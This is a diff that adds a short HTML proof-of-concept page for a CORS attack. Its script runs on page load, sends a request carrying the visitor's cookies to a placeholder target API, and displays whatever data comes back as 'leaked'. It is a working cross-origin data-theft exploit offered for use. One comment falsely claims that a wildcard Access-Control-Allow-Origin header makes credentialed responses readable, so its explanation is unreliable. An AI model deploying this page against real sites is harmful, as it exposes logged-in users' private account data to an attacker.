@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Proof of Concept</title>
+</head>
+<body>
+    <h1>CORS Attack Launched</h1>
+    <p>Watching the browser console will show the leaked sensitive data.</p>
+    <div id="result">Waiting for response...</div>
+
+    <script>
+        const TARGET_URL = 'REPLACE_ME_WITH_YOUR_SENSITIVE_TARGET_URL'; // e.g., https://www.targetsite.com/api/user/balance
+
+        fetch(TARGET_URL, {
+            method: 'GET',
+            // CRITICAL: This flag tells the browser to include the user's cookie(s).
+            credentials: 'include' 
+        })
+        .then(response => {
+            // The browser checks the header here. If ACAO: * is present, 
+            // the response is readable, and the request succeeds.
+            if (response.ok) {
+                return response.json(); // Use .json() or .text() depending on the response format
+            }
+            throw new Error('Response failed or headers blocked read access.');
+        })
+        .then(data => {
+            // SUCCESS! The external domain has read the internal data.
+            console.log("SUCCESS! LEAKED SENSITIVE DATA:", data);
+            document.getElementById('result').innerHTML = '<b>SUCCESS! Data Leaked:</b><br>' + JSON.stringify(data, null, 2);
+        })
+        .catch(error => {
+            console.error('Fetch Error:', error);
+            document.getElementById('result').innerText = 'ATTACK FAILED: ' + error.message;
+        });
+    </script>
+</body>
+</html>
